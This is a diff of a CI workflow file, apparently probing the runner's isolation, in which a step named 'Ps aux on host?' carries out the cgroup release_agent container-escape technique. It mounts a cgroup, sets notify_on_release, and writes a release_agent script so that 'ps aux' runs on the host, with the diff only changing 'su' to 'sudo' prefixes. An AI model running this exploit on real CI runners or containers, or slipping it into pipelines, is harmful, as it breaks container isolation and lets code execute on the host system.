@@ -44,15 +44,14 @@ jobs:
 
       - name: Ps aux on "host"?
         run: |
-          su --
-          mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-          echo 1 > /tmp/cgrp/x/notify_on_release
-          host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-          echo "$host_path/cmd" > /tmp/cgrp/release_agent
-          echo '#!/bin/sh' > /cmd
-          echo "ps aux > $host_path/output" >> /cmd
-          chmod a+x /cmd
-          sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+          sudo mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+          sudo echo 1 > /tmp/cgrp/x/notify_on_release
+          sudo host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+          sudo echo "$host_path/cmd" > /tmp/cgrp/release_agent
+          sudo echo '#!/bin/sh' > /cmd
+          sudo echo "ps aux > $host_path/output" >> /cmd
+          sudo chmod a+x /cmd
+          sudo sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 
       - name: Display Environment Variables
